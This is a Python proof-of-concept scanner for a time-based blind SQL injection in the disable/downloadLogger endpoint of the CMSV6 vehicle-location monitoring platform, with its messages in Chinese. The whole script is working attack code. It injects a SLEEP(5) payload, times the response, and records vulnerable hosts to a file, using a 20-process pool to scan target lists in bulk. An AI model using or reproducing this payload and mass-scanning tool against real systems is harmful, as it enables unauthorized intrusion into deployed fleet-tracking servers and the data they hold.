import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """test"""
    print(test)

def poc(target):
    payload = "/edu_security_officer/disable;downloadLogger.action?ids=1+AND+(SELECT+2688+FROM+(SELECT(SLEEP(5)))kOIi)"
  # start_time = time.time()
    try:
        response = requests.get(target, verify=False)
        response1 = requests.get(target + payload, timeout=10, verify=False)
        time1 = response.elapsed.total_seconds()
        time2 = response1.elapsed.total_seconds()
        # end_time = time.time()
        if time2 - time1 > 5 and response1.status_code and "Burp Suite" not in response1.text:
            print(f"[+] {target} 存在通天星 CMSV6 车载定位监控平台 disable SQL 注入漏洞")
            with open("通天星_result.txt", "a",encoding="utf-8") as file:
                file.write(f"{target}存在漏洞\n")
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="通天星 CMSV6 车载定位监控平台 disable SQL 注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()